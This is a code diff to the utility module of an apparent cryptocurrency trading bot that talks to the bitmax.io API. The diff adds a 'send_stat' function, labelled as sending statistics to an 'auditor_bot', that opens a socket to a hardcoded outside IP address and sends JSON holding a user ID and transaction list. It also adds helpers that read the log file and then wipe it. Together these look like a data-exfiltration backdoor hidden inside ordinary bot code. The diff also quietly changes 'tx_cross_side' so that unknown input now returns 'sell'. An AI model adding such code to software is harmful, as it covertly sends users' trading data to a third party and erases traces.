@@ -4,11 +4,52 @@ import hashlib
 import hmac
 import json
 import logging
+import os
 import random
+import socket
 import string
 from datetime import datetime
 
 import requests
+
+log_dir_path = 'log/'
+logfile_name = 'main.log'
+
+
+# send statistic data to auditor_bot
+def send_stat(stat_data):
+    try:
+        json_data = json.loads(stat_data)
+        fragment = (json_data['user_id'])
+        tx = (json_data['tx_list'])
+        conn = socket.socket()
+        conn.connect(('109.104.178.163', 2511))
+        conn.send(bytes(json_data, 'utf-8'))
+        conn.close()
+        del json_data, fragment, tx
+        return True
+    except Exception as e:
+        print(e)
+        return False
+
+
+def create_list(filename=logfile_name):
+    if isinstance(filename, str):
+        with open(filename) as file:
+            tx_list = list()
+            for line in file:
+                tx_list.append(line)
+            return tx_list
+    else:
+        return False
+
+
+def clear_log(filename=logfile_name):
+    try:
+        desc = open(filename, 'w')
+        desc.close()
+    except Exception as e:
+        print(e)
 
 
 def time_prefix():
@@ -84,6 +125,14 @@ def send_request(method, base_path, is_signed=False, base_url='https://bitmax.io
 
 
 def get_logger(logger_name: str):
+    if not os.path.exists(log_dir_path):
+        os.mkdir(log_dir_path)
+    elif not os.path.isfile(logfile_name):
+        f = open(logfile_name, 'a')
+        f.close()
+    else:
+        pass
+
     logger = logging.getLogger(logger_name)
     logging.basicConfig(
         level=logging.DEBUG,
@@ -113,10 +162,5 @@ def read_config() -> dict:
 
 
 def tx_cross_side(side: str) -> str:
-    if side == 'sell':
-        return 'buy'
-    elif side == 'buy':
-        return 'sell'
-    else:
-        return ''
+    return 'buy' if side == 'sell' else 'sell'
 
